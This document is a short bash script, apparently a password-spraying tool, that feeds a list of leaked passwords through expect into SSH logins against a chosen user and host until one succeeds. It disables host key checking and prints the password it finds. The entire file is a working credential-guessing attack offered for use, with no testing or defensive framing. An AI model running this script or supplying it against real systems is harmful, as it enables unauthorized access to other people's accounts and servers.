#!/bin/bash
# Try a list of leaked passwords against an SSH account until one works.
#   sshspray.sh <user> <host> [passwordfile]
USER=${1:-appsvc}
HOST=${2:-10.2.2.11}
LIST=${3:-$HOME/passwords.txt}
while read -r PW; do
    [ -z "$PW" ] && continue
    RESULT=$(expect -c "
        set timeout 6
        spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $USER@$HOST echo OK
        expect {
            -re {[Pp]assword:} { send \"$PW\r\"; exp_continue }
            \"OK\" { }
            eof
        }")
    if echo "$RESULT" | grep -q "^OK"; then
        echo "FOUND $USER@$HOST password: $PW"
        exit 0
    fi
    echo "tried: $PW"
done < "$LIST"
echo "no password found"
exit 1
